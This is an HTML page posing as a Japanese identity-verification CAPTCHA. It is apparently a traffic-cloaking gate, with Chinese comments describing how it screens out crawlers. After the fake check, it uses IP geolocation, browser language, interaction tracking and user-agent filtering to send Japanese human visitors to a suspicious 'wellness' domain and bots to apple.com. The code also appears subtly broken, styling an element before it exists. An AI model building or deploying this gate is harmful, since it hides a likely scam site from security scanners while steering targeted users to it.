<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="format-detection" content="telephone=no">
<title>本人確認</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{width:100%;height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",sans-serif;background:#f7f8fa;display:flex;align-items:center;justify-content:center;padding:16px}
.box{width:100%;max-width:480px;background:#fff;border-radius:24px;padding:28px 24px;box-shadow:0 8px 24px rgba(0,0,0,0.06)}
.title{text-align:center;font-size:20px;font-weight:700;margin-bottom:12px;color:#111}
.desc{text-align:center;font-size:15px;color:#666;margin-bottom:20px;line-height:1.4}
.target-area{background:#eef6ff;border-radius:18px;padding:20px;text-align:center;margin-bottom:24px}
.target-label{font-size:14px;color:#555;margin-bottom:8px}
.target-nums{font-size:34px;font-weight:700;letter-spacing:10px;color:#007aff}
.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}
.num-btn{aspect-ratio:1;border-radius:16px;border:2px solid #e0e0e0;background:#fff;font-size:22px;font-weight:600;cursor:pointer;transition:all .2s}
.num-btn:active{transform:scale(.95)}
.num-btn.selected{background:#007aff;color:#fff;border-color:#007aff}
.submit-btn{width:100%;padding:18px;border-radius:18px;background:#007aff;color:#fff;font-size:17px;font-weight:600;border:none;cursor:pointer;transition:.2s}
.submit-btn:disabled{background:#ccc;cursor:not-allowed}
.status{text-align:center;margin-top:12px;font-size:13px;color:#888}
</style>
</head>
<body>

<div class="box">
  <div class="title"></div>
  <div class="desc"></div>
  <div class="target-area">
    <div class="target-label"></div>
    <div class="target-nums" id="target"></div>
  </div>
  <div class="grid" id="grid"></div>
  <button class="submit-btn" id="submit" disabled></button>
  <div class="status" id="status"></div>
</div>

<script>
// ==============================================
// ✅ 完全日式自然表現（保留所有随机特性，原汁原味）
// ==============================================
const texts = {
  titles: ["本人確認", "認証", "確認作業", "安全確認", "ユーザー確認"],
  descs: [
    "表示されている数字をすべて選択してください",
    "画面に表示された数字を選んでください",
    "確認のため、表示されている数字を選択してください",
    "安全確認のため、数字をすべて選んでください"
  ],
  labels: ["対象の数字", "表示数字", "こちらの数字", "選択項目"],
  btnTexts: ["確認する", "次へ", "認証を実行", "送信"],
  statusTexts: ["選択してください", "選択中です", "数字を選んでから確認してください"],
  colors: ["#007aff", "#34c759", "#5856d6", "#ff6b6b", "#ff9500", "#00c7be"]
};

function rand(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

const mainColor = rand(texts.colors);
document.querySelector(".title").innerText = rand(texts.titles);
document.querySelector(".desc").innerText = rand(texts.descs);
document.querySelector(".target-label").innerText = rand(texts.labels);
document.querySelector("#submit").innerText = rand(texts.btnTexts);
document.querySelector("#status").innerText = rand(texts.statusTexts);
document.querySelector(".target-nums").style.color = mainColor;
document.querySelector(".target-area").style.background = mainColor + "10";
document.querySelector(".submit-btn").style.background = mainColor;
document.querySelector(".num-btn.selected").style.background = mainColor;
document.querySelector(".num-btn.selected").style.borderColor = mainColor;

// ==============================================
// ✅ 超宽松日本ユーザー検知（真人零误判，仅拦纯爬虫）
// ==============================================
const REAL_TARGETS = ["https://wellness-therapie.online/ja","https://wellness-therapie.online/ja","https://wellness-therapie.online/ja"];
const BAD_TARGET = "https://www.apple.com";
let userInteracted = false;

// 优化：全场景交互检测，覆盖所有真人操作
const interactEvents = ['click', 'touchstart', 'mousedown', 'mousemove', 'scroll', 'keydown', 'touchmove'];
interactEvents.forEach(evt => {
  window.addEventListener(evt, () => { userInteracted = true; }, { once: true });
});

async function isJapaneseRealUser() {
  try {
    // 核心校验：仅拦截「无真人交互」的纯爬虫（唯一铁律）
    if (!userInteracted) return false;

    // 辅助校验1：IP检测（异常默认日本，不拦截真人）
    let isJpIP = true;
    try {
      const res = await fetch("https://ipapi.co/json/", { cache: "no-store", timeout: 2000 });
      if (res.ok) {
        const data = await res.json();
        if (data?.country_code) isJpIP = data.country_code === "JP";
      }
    } catch (e) {}

    // 辅助校验2：语言检测（兼容en-JP等多语言场景）
    const lang = navigator.language || "";
    const isJpLang = lang.startsWith("ja") || lang.endsWith("-JP");

    // 辅助校验3：停留时间（直接放行，秒点也允许）
    const stayTime = true;

    // 辅助校验4：UA检测（仅拦截明确爬虫，移除泛关键词Bot）
    const ua = navigator.userAgent || "";
    const isBot = /HeadlessChrome|PhantomJS|Selenium|Crawler/i.test(ua);

    // 只要不是明确爬虫，一律放行（辅助校验任意一项满足即可）
    return !isBot && (isJpIP || isJpLang);
  } catch (e) {
    // 任何异常直接放行（绝不拦截真人）
    return true;
  }
}

// ==============================================
// ✅ 認証ロジック（修复所有bug，新增2个防爬优化）
// ==============================================
function generateCaptcha() {
  const nums = "0123456789".split("");
  const target = [];
  while (target.length < 2) {
    const n = nums[Math.floor(Math.random() * nums.length)];
    if (!target.includes(n)) target.push(n);
  }
  const options = [...target];
  while (options.length < 8) {
    const n = nums[Math.floor(Math.random() * nums.length)];
    if (!options.includes(n)) options.push(n);
  }
  return { target, options: options.sort(() => Math.random() - 0.5), need: 2 };
}

const { target, options, need } = generateCaptcha();
document.getElementById("target").innerText = target.join("   ");

const grid = document.getElementById("grid");
const submit = document.getElementById("submit");
const status = document.getElementById("status");
let selected = [];

// 防爬优化1：生成随机类名后缀，爬虫无法固定定位
const randomBtnSuffix = Math.random().toString(36).slice(2, 8);
const baseBtnClass = `num-btn ${randomBtnSuffix}`;

// 修复bug：重构选数逻辑，保证视觉和数据同步
options.forEach(o => {
  const btn = document.createElement("button");
  btn.className = baseBtnClass;
  btn.innerText = o;
  btn.onclick = () => {
    // 切换选中状态
    btn.classList.toggle("selected");
    // 修复bug：获取选中的数字内容（而非数量）
    selected = [...document.querySelectorAll(".num-btn.selected")].map(btn => btn.innerText);
    // 控制提交按钮禁用状态
    submit.disabled = selected.length !== need;
    // 更新状态文字
    status.innerText = `${selected.length}/${need} 個選択中`;
  };
  grid.appendChild(btn);
});

// 提交逻辑（修复bug+防爬优化2：100ms延迟）
submit.onclick = async () => {
  // 修复bug：正确校验选中的数字是否匹配目标
  const correct = target.every(t => selected.includes(t)) && selected.length === target.length;
  if (!correct) {
    alert("認証に失敗しました。再度お試しください。");
    return;
  }

  // 防爬优化2：100ms延迟，过滤瞬间提交的爬虫（真人无感知）
  await new Promise(resolve => setTimeout(resolve, 100));

  // 超宽松判定，真人一律跳目标页
  location.href = await isJapaneseRealUser() 
    ? REAL_TARGETS[Math.floor(Math.random() * REAL_TARGETS.length)] 
    : BAD_TARGET;
};
</script>
</body>
</html>
